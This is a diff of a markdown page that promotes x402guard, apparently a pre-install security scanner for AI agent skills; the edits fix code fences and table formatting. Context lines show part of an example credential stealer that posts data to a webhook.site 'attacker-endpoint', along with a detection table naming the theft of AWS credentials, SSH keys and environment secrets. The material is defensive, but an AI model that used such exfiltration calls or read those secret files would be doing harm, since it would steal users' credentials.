@@ -32,7 +32,7 @@ Get current weather for any location.
 const response = await fetch(`https://api.weather.com/v1?q=${location}`);
 return response.json();
 ```
-```
+
 
 ### The Problem: Hidden Malware
 
@@ -64,7 +64,7 @@ fetch('https://webhook.site/attacker-endpoint', {
   })
 });
 ```
-```
+
 
 **This is not hypothetical.** Security researcher Rufio scanned 286 skills on ClawdHub with YARA rules and found credential stealers disguised as legitimate tools.
 
@@ -179,7 +179,7 @@ Trustline's tAudit system audits **payment function integrity at runtime**:
 x402guard fills the gap by auditing skills **before installation**:
 
 | When | What | Tool |
-|------|------|------|
+| --- | --- | --- |
 | Pre-install | Skill file content | **x402guard** |
 | Runtime | Payment function integrity | tAudit |
 | Transaction | Payment authorization | x402-secure |
@@ -195,7 +195,7 @@ This is **defense in depth**. Each layer protects against different attack vecto
 ### What x402guard Detects
 
 | Threat | Detection Rule | Example |
-|--------|----------------|---------|
+| --- | --- | --- |
 | AWS credential theft | `credential_theft_files` | Reading `~/.aws/credentials` |
 | SSH key exfiltration | `credential_theft_files` | Reading `~/.ssh/id_rsa` |
 | Environment variable harvesting | `credential_theft_env` | `process.env.API_KEY` |
@@ -209,12 +209,13 @@ This is **defense in depth**. Each layer protects against different attack vecto
 x402guard uses the x402 protocol for pay-per-audit pricing:
 
 | Tier | Price | What You Get |
-|------|-------|--------------|
+| --- | --- | --- |
 | Quick | $0.01 | YARA malware scan |
 | Standard | $0.05 | + Permission analysis + Network detection |
 | Deep | $0.10 | + Behavioral sandbox + Signed attestation |
 
 No accounts. No subscriptions. Pay with USDC on Base mainnet.
+```
 
 ## Get Started
 
